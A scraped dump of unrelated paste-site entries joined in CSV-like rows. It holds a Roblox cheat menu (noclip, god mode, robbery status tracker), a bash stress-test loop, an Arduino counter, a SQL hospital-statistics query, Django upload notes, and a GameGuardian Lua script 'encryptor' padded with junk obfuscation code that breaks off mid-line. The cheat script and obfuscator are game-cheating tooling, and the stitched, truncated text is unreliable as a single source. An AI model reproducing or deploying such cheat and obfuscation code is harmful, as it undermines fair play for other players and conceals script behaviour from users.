local PlayerTab = Window:MakeTab({ Name = ""🧍 Player"", Icon = """", PremiumOnly = false })

PlayerTab:AddButton({
Name = ""🔁 إعادة تعيين اللاعب"",
Callback = function()
local hum = player.Character and player.Character:FindFirstChild(""Humanoid"")
if hum then hum.Health = 0 end
end
})

PlayerTab:AddButton({
Name = ""🚪 تفعيل Noclip"",
Callback = function()
RunService.Stepped:Connect(function()
for _, part in ipairs(player.Character:GetDescendants()) do
if part:IsA(""BasePart"") then
part.CanCollide = false
end
end
end)
end
})

PlayerTab:AddButton({
Name = ""❤️ منع الموت"",
Callback = function()
local hum = player.Character:WaitForChild(""Humanoid"")
hum:GetPropertyChangedSignal(""Health""):Connect(function()
if hum.Health < 100 then hum.Health = 100 end
end)
end
})
---

-- 🚗 Car Tab

local CarTab = Window:MakeTab({ Name = ""🚗 Car"", Icon = """", PremiumOnly = false })

CarTab:AddButton({
Name = ""⬆️ رفع السيارة"",
Callback = function()
local vehicle = Workspace:FindFirstChild(""Vehicles""):FindFirstChild(player.Name)
if not vehicle then return end
for _, part in ipairs(vehicle:GetDescendants()) do
if part:IsA(""SpringConstraint"") then
part.FreeLength += 1.5
end
end
end
})

CarTab:AddButton({
Name = ""⬇️ خفض السيارة"",
Callback = function()
local vehicle = Workspace:FindFirstChild(""Vehicles""):FindFirstChild(player.Name)
if not vehicle then return end
for _, part in ipairs(vehicle:GetDescendants()) do
if part:IsA(""SpringConstraint"") then
part.FreeLength -= 1.5
end
end
end
})

CarTab:AddButton({
Name = ""🔁 إعادة السيارة للوضع الطبيعي"",
Callback = function()
local vehicle = Workspace:FindFirstChild(""Vehicles""):FindFirstChild(player.Name)
if not vehicle then return end
for _, part in ipairs(vehicle:GetDescendants()) do
if part:IsA(""SpringConstraint"") then
part.FreeLength = 2.5
end
end
end
})

CarTab:AddButton({
Name = ""🚘 رسبنة السيارة أمامك"",
Callback = function()
local carModel = game.ReplicatedStorage:WaitForChild(""MyCar""):Clone()
carModel.Parent = Workspace
carModel:SetPrimaryPartCFrame(player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -10))
end
})

CarTab:AddButton({
Name = ""🪑 الجلوس تلقائي في السيارة"",
Callback = function()
local seat = Workspace:FindFirstChildWhichIsA(""VehicleSeat"", true)
if seat then
player.Character:MoveTo(seat.Position)
wait(1)
seat:Sit(player.Character:WaitForChild(""Humanoid""))
end
end
})


---

-- 🏦 Robbery Status Tab

local RobberyTab = Window:MakeTab({ Name = ""🏦 Robbery"", Icon = """", PremiumOnly = false })

RobberyTab:AddButton({
Name = ""💰 التحقق من حالة البنك والمجوهرات"",
Callback = function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local Workspace = game:GetService(""Workspace"")

local jewelryUIs = {}

local function createShadow(frame)
    local shadow = Instance.new(""ImageLabel"")
    shadow.Size = UDim2.new(1, 10, 1, 10)
    shadow.Position = UDim2.new(0, 5, 0, 5)
    shadow.BackgroundTransparency = 1
    shadow.Image = ""rbxassetid://6014261993"" 
    shadow.ImageColor3 = Color3.new(0, 0, 0)
    shadow.ImageTransparency = 0.5
    shadow.ZIndex = 0
    shadow.Parent = frame
end

local player = Players.LocalPlayer
local playerGui = player:WaitForChild(""PlayerGui"")

local existingGui = playerGui:FindFirstChild(""RobberyNotifier"")
if existingGui then
    existingGui:Destroy()
end

local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""RobberyNotifier""
screenGui.Parent = playerGui

local frame = Instance.new(""Frame"")
frame.Size = UDim2.new(0, 400, 0, 60)
frame.Position = UDim2.new(0, 10, 0, 10)
frame.BackgroundColor3 = Color3.new(30/255, 30/255, 30/255)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local uiCorner = Instance.new(""UICorner"")
uiCorner.CornerRadius = UDim.new(0, 8)
uiCorner.Parent = frame

local uiGradient = Instance.new(""UIGradient"")
uiGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.new(40/255, 40/255, 40/255)),
    ColorSequenceKeypoint.new(1, Color3.new(50/255, 50/255, 50/255))
}
uiGradient.Parent = frame

createShadow(frame) 

local bankLabel = Instance.new(""TextLabel"")
bankLabel.Size = UDim2.new(1, -20, 1, 0)
bankLabel.Position = UDim2.new(0, 10, 0, 0)
bankLabel.BackgroundTransparency = 1
bankLabel.TextColor3 = Color3.new(255/255, 255/255, 255/255)
bankLabel.Text = ""Bank Status: Checking...""
bankLabel.Font = Enum.Font.Gotham
bankLabel.TextSize = 18
bankLabel.Parent = frame

local bankRobbery = Workspace.Robberies:WaitForChild(""BankRobbery"")
local lightGreen = bankRobbery:WaitForChild(""LightGreen"")
local lightRed = bankRobbery:WaitForChild(""LightRed"")
local jewelerRobbery = Workspace.Robberies:WaitForChild(""JewelerRobbery"")
local robbables = jewelerRobbery:WaitForChild(""Robbables"")

local bankWasClosed = false

local function checkBankStatus()
    local greenBrickColor = lightGreen.BrickColor
    local redColor = lightRed.Color

    if greenBrickColor == BrickColor.new(""Camo"") then
        bankLabel.Text = ""Bank Status: Open""
        bankLabel.TextColor3 = Color3.new(0/255, 255/255, 0/255)
        if bankWasClosed then
            bankLabel.Text = ""Bank Status: Open (Just Opened!)""
            spawn(function()
                wait(3)
                if bankLabel.Text == ""Bank Status: Open (Just Opened!)"" then
                    bankLabel.Text = ""Bank Status: Open""
                end
            end)
        end
        bankWasClosed = false
    else
        bankLabel.Text = ""Bank Status: Closed""
        bankLabel.TextColor3 = Color3.new(255/255, 255/255, 0/255)
        bankWasClosed = true
    end
end

local function checkJewelryStatus()
    for model, uiFrame in pairs(jewelryUIs) do
        if model:GetAttribute(""Broken"") then
            uiFrame:Destroy()
            jewelryUIs[model] = nil
        end
    end

    task.spawn(function() 
        for _, model in pairs(robbables:GetChildren()) do
            if model:IsA(""Model"") then
                local enabled = model:GetAttribute(""Enabled"")
                local broken = model:GetAttribute(""Broken"")
    
                if enabled and not broken and not jewelryUIs[model] then
                    local uiFrame = Instance.new(""Frame"")
                    uiFrame.Size = UDim2.new(0, 400, 0, 50)
                    uiFrame.Position = UDim2.new(0, 10, 0, 80 + (#jewelryUIs * 60))
                    uiFrame.BackgroundColor3 = Color3.new(40/255, 40/255, 40/255)
                    uiFrame.BorderSizePixel = 0
                    uiFrame.Parent = screenGui
    
                    local uiCorner = Instance.new(""UICorner"")
                    uiCorner.CornerRadius = UDim.new(0, 8) -- Rounded corners
                    uiCorner.Parent = uiFrame
    
                    local uiGradient = Instance.new(""UIGradient"")
                    uiGradient.Color = ColorSequence.new{
                        ColorSequenceKeypoint.new(0, Color3.new(50/255, 50/255, 50/255)),
                        ColorSequenceKeypoint.new(1, Color3.new(60/255, 60/255, 60/255))
                    }
                    uiGradient.Parent = uiFrame
    
                    local uiLabel = Instance.new(""TextLabel"")
                    uiLabel.Size = UDim2.new(1, -20, 1, 0)
                    uiLabel.Position = UDim2.new(0, 10, 0, 0)
                    uiLabel.BackgroundTransparency = 1
                    uiLabel.TextColor3 = Color3.new(0/255, 200/255, 0/255)
                    uiLabel.Text = model.Name .. "" (Not Robbed)""
                    uiLabel.Font = Enum.Font.Gotham
                    uiLabel.TextSize = 16
                    uiLabel.Parent = uiFrame
    
                    createShadow(uiFrame)
    
                    jewelryUIs[model] = uiFrame
                end
            end
        end
    end)
end

RunService.Heartbeat:Connect(function()
    checkBankStatus()
    checkJewelryStatus()
end)

checkBankStatus()
checkJewelryStatus()
end
})


---

OrionLib:Init()

"
fVrQGUtN,Stress Test - Bash,Abrar_Al_Samit,Bash,Tuesday 17th of June 2025 10:17:45 AM CDT,"for((i=1;;i++)); do
	echo $i
	./gen $i > in
	diff -w <(./exe1 < in) <(./exe2 < in) || break
done"
Ax3PRAMK,**Count Display** rev_01,pleasedontcode,Arduino,Tuesday 17th of June 2025 09:15:53 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Count Display**
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-06-17 14:14:58

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Écrire un programme pour un compteur modulo 24 */
	/* avec Var1 unité et var2 dizaine */
/****** SYSTEM REQUIREMENT 2 *****/
	/* Créez un programme de comptage modulo 24 en */
	/* utilisant Var1 pour les unités et var2 pour les */
	/* dizaines et avec cathode commune */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <Arduino.h>
#include <Wire.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

// Define variables for units and tens
int var1 = 0; // Units
int var2 = 0; // Tens

// Function to update the display (for demonstration purposes)
void updateDisplay(int units, int tens) {
    // This function would contain code to update a 7-segment display
    // For example, using digitalWrite to light up segments
}

/****** SETUP FUNCTION *****/
void setup(void)
{
    // Initialize serial communication for debugging
    Serial.begin(9600);
    
    // Initialize display or other components as needed
    // For example: display.begin();
}

/****** LOOP FUNCTION *****/
void loop(void)
{
    // Increment the counter
    var1++;
    
    // Check if var1 exceeds 9 (units)
    if (var1 >= 10) {
        var1 = 0; // Reset units
        var2++; // Increment tens
    }
    
    // Check if var2 exceeds 2 (tens for modulo 24)
    if (var2 >= 3) {
        var2 = 0; // Reset tens
    }
    
    // Update the display with the current values
    updateDisplay(var1, var2);
    
    // Print the current count for debugging
    Serial.print(""Count: "");
    Serial.print(var2);
    Serial.print(var1);
    Serial.println();
    
    // Delay for a while to make the counting visible
    delay(1000); // Adjust delay as necessary
}

/* END CODE */"
C7C7bL03,3500 form,temaon_lieto,SQL,Tuesday 17th of June 2025 08:54:40 AM CDT,"WITH protocol_procedures AS (SELECT cascade_lvl03_surgical_procedures.*
                             FROM cascade_lvl03_surgical_procedures
                             WHERE cascade_lvl03_surgical_procedures.procedure_performed_date BETWEEN '2024-01-01 00:00:00' AND '2025-01-01 23:59:59'
                               AND cascade_lvl03_surgical_procedures.legal_entity_id = 3382),
     groups_mappers AS (SELECT dict_table3500service_mappers.*
                        FROM dict_table3500service_mappers
                        WHERE dict_table3500service_mappers.line_number != '4.7'),
     main_table AS (SELECT MAX(mappers.surgery_type_title)                                                                                  AS surgery_name,
                           mappers.line_number                                                                                              AS line_number,
                           mappers.major                                                                                                    AS major,
                           mappers.minor                                                                                                    AS minor,
                           countIf(DISTINCT (sp.id), (sp.patient_id IS NOT NULL AND
                                                      (mappers.line_number != '7.2' OR sp.patient_age < 1) AND
                                                      ((mappers.has_icd10_codes = 0 OR dtim.code != '') AND
                                                       (mappers.has_addition_icd10_codes = 0 OR dtaim.code != ''))))                        AS surgeries_count,
                           countIf(DISTINCT (sp.id), (sp.patient_id IS NOT NULL AND
                                                      (mappers.line_number != '7.2' OR sp.patient_age < 1) AND
                                                      ((mappers.has_icd10_codes = 0 OR dtim.code != '') AND
                                                       (mappers.has_addition_icd10_codes = 0 OR dtaim.code != '')) AND
                                                      (CASE
                                                           WHEN mappers.line_number IN ('13.2', '13.0')
                                                               THEN mappers.line_number = '13.0' AND patient_age < 18
                                                           WHEN mappers.line_number = '12.0' THEN false
                                                           ELSE patient_age < 18 END)))                                                     AS under_17_years_count,
                           countIf(DISTINCT (sp.patient_id), (sp.patient_id IS NOT NULL AND
                                                              (mappers.line_number != '7.2' OR sp.patient_age < 1) AND
                                                              ((mappers.has_icd10_codes = 0 OR dtim.code != '') AND
                                                               (mappers.has_addition_icd10_codes = 0 OR dtaim.code != '')) AND
                                                              (sp.discharge_disposition_code = 'death')))                                   AS deaths_count,
                           countIf(DISTINCT (sp.patient_id), (sp.patient_id IS NOT NULL AND
                                                              (mappers.line_number != '7.2' OR sp.patient_age < 1) AND
                                                              ((mappers.has_icd10_codes = 0 OR dtim.code != '') AND
                                                               (mappers.has_addition_icd10_codes = 0 OR dtaim.code != '')) AND
                                                              sp.discharge_disposition_code = 'death' AND (CASE
                                                                                                               WHEN mappers.line_number IN ('13.2', '13.0')
                                                                                                                   THEN mappers.line_number = '13.0' AND patient_age < 18
                                                                                                               WHEN mappers.line_number = '12.0'
                                                                                                                   THEN false
                                                                                                               ELSE patient_age < 18 END))) AS under_17_years_deaths_count,
                           countIf(DISTINCT (sp.patient_id), (sp.patient_id IS NOT NULL AND
                                                              (mappers.line_number != '7.2' OR sp.patient_age < 1) AND
                                                              ((mappers.has_icd10_codes = 0 OR dtim.code != '') AND
                                                               (mappers.has_addition_icd10_codes = 0 OR dtaim.code != '')) AND
                                                              sp.is_village =
                                                              1))                                                                           AS villagers_count

                    FROM groups_mappers mappers
                             LEFT JOIN protocol_procedures sp ON mappers.code = sp.service_code
                             LEFT JOIN dict_table3500_icd10_mappers dtim
                                       ON dtim.code = sp.icd10_code AND mappers.mapper_id = dtim.mapper_id
                             LEFT JOIN dict_table3500_addition_icd10_mappers dtaim
                                       ON dtaim.code = sp.icd10_code AND mappers.mapper_id = dtaim.mapper_id
                    GROUP BY mappers.line_number, mappers.major, mappers.minor
                    ORDER BY (mappers.major, mappers.minor) ASC),
     header_table AS (SELECT 'Усього операцій, у тому числі:'    AS surgery_name,
                             '1.0'                               AS line_number,
                             1                                   AS major,
                             0                                   AS minor,
                             SUM(mt.surgeries_count)             AS surgeries_count,
                             SUM(mt.under_17_years_count)        AS under_17_years_count,
                             SUM(mt.deaths_count)                AS deaths_count,
                             SUM(mt.under_17_years_deaths_count) AS under_17_years_deaths_count,
                             SUM(mt.villagers_count)             AS villagers_count
                      FROM main_table mt
                      WHERE mt.minor = 0)
SELECT header_table.*
FROM header_table
UNION ALL
SELECT main_table.*
FROM main_table"
JETBJ9aA,Uploading of many file in Django App,horozov86,Python,Tuesday 17th of June 2025 08:36:41 AM CDT,"Качване на множество файлове във формата независимо дали са снимки или видео?
Чрез единични полета във вече съществуващия модел не работи, понеже по този начин се качват по една снимка и по едно видео.
Решението е да се направи допълнителен модел .....Media, който се свързва с първия модел. В него се добавя поле file = models.FileField и се оказва, къде ще се качват файловете.

Пример:
Първи модел

django.contrib.auth import get_user_model
from django.db import models
from django.utils import timezone

UserModel = get_user_model()


class Publication(models.Model):
    location = models.CharField(
        max_length=200,
        null=True,
        blank=True,
    )

    description = models.TextField(
        null=False,
        blank=False,
    )


    weight_kg = models.FloatField(
        null=True,
        blank=True,
    )

    created_at = models.DateTimeField(
        default=timezone.now,
    )

    user = models.ForeignKey(UserModel, on_delete=models.CASCADE)


Втори модел

class PublicationMedia(models.Model):
    MEDIA_TYPE_CHOICES = (
        ('image', 'Image'),
        ('video', 'Video'),
    )
    publication = models.ForeignKey(Publication, on_delete=models.CASCADE)
    file = models.FileField(upload_to='files/')
    media_type = models.CharField(max_length=5, choices=MEDIA_TYPE_CHOICES)


Формата не се променя и не й се добавя допълнителни полета. С добавено допълнително поле не работи, понеже това поле идва от другия модел. Остава си така:

class PublicationBaseForm(forms.ModelForm):
    class Meta:
        model = Publication
        fields = [""location"", ""description"", ""weight_kg""]
        widgets = {
            'location': forms.TextInput(attrs={'placeholder': 'Enter your fishing location'}),
            'description': forms.Textarea(attrs={'placeholder': 'Enter a description of your fishing experience'}),
            'weight_kg': forms.NumberInput(attrs={'placeholder': 'Enter weight of the fish'}),
        }


След което ръчно се добавя полето за качване на файловете в html-a по този начин:

<input type=""file"" name=""media_files"" multiple>

<input class=""publication-create-btn"" type=""submit"" value=""Add Publication"" />

Във view-то в променливата media_files става списък с качените файлове обекти.
Итерира се през всички файлове с for цикъл и се записва всеки един файл в базата свързан с публикацията.

@method_decorator(login_required, name='dispatch')
class PublicationCreateView(views.CreateView):
    form_class = PublicationCreateForm
    model = Publication
    template_name = ""publications/publication_create.html""
    success_url = reverse_lazy(""feed"")

    def form_valid(self, form):
        self.object = form.save(commit=False)
        self.object.user = self.request.user
        self.object.save()

        media_files = self.request.FILES.getlist('media_files') --> списък от фаловете
        for file in media_files: --> итерира се
            content_type = file.content_type
            media_type = 'video' if content_type.startswith('video') else 'image' --> взима се типа на файла
            PublicationMedia.objects.create(
                publication=self.object,
                file=file,
                media_type=media_type
            ) --> създава се обект

        return super().form_valid(form)"
a064Zzna,Tools,cnsnipermike,Lua,Tuesday 17th of June 2025 07:55:38 AM CDT,"function Main()
MAIN = gg.choice({
""联系方式"",
""加密工具"",
""退出"",
})
if MAIN == nil then
else
if MAIN == 1 then A1() end
if MAIN == 2 then A2() end
if MAIN == 3 then End() end
end
FMXR=-1
end
function A1()
gg.alert('Telegram@sijimuge\n微信：feimengxinren044\nLine：pubglegends205\n\n加了联系方式请明确表明来意，感謝配合')
Main()
end
function END()
gg.setVisible(true)
os.exit()
end
function A2()
gg.alert(""2020年开发的加密工具1.0\n可能会被破解，但也能做到最基础的保护"")
;(function()
if gg.VERSION < ""101.1"" then return gg.alert(""Use minimal GG Version 90.0"") else
local g = {}
g.last = gg.getFile()
g.info = nil
g.config = gg.EXT_CACHE_DIR .. ""/"" .. gg.getFile():match(""[^/]+$"") .. "".cfg""
g.data = loadfile(g.config)
if g.data ~= nil then
g.info = g.data()
g.data = nil
end
if g.info == nil then
g.info = {g.last, g.last:gsub(""/[^/]+$"", """")}
end
local mode_read_only = 'r'
local mode_read_all = '*a'
local mode_write_only = 'w'
local data_read = function(read_path, open_mode, read_mode)
local read_file = io.open(read_path, open_mode)
local content = read_file:read(read_mode)
read_file:close()
return content
end
local data_write = function(write_path, write_mode, data_to_write)
local write_file = io.open(write_path, write_mode)
write_file:write(data_to_write)
write_file:write("""")
write_file:close()
end
while true do
g.info = gg.prompt({
""📎 选择脚本: "", --1
""📂 选择加密后保存路径: "", --2
""⏳ 设置过期日"", --3
""🔐 添加密码"", --4
}, g.info, {
""file"", --1
""path"", --2
""checkbox"", --3
""checkbox"", --4
})
if g.info == nil then Main() end
if g.info[1] == '' then 
local LUA_File_nil = ""⚠️️ 错误 ⚠️️\n\n文件不存在！""
return gg.alert(LUA_File_nil)
end
if g.info[2] == '' then 
local LUA_File_nil = ""⚠️️ 错误 ⚠️️\n\n路径不存在！""
return gg.alert(LUA_File_nil)
end
gg.saveVariable(g.info, g.config)
if g.info[1]:match(""%.lua$"") ~= nil then
LUA_Script_filter = g.info[1]:match(""[^/]+$""):gsub(""%.lua$"", function(c)
c = "".enc.lua""
return c 
end)
else
local File_not_lua = ""⚠️️ 错误 ⚠️️\n\n检测到非 lua 脚本！""
return gg.alert(File_not_lua)
end
Test = data_read(g.info[1], mode_read_only, mode_read_all)
if (5 * string.len(Test) >= 10000000) then
Big_file = ""⚠️️ 错误 ⚠️️\n\n源文件过大！""
print(Big_file)
return gg.alert(Big_file)
else
if load(Test) == nil then
return gg.alert(""⚠️️ 无法加密！ ⚠️️"")
end
end
LUA_Script_out = g.info[2] .. ""/"" .. LUA_Script_filter
function KeyToInt()
key1 = 11
key2 = 12
return_key = key1 + key2
return return_key
end
local Encrypt = function(str, textKey)
local text = ''
for i = 1, #str do
text = text .. '#' .. string.byte(str:sub(i, i)) + KeyToInt(textKey) %256
end
return text
end
local Decrypt = [============================================[
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
key1 = 11 
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, 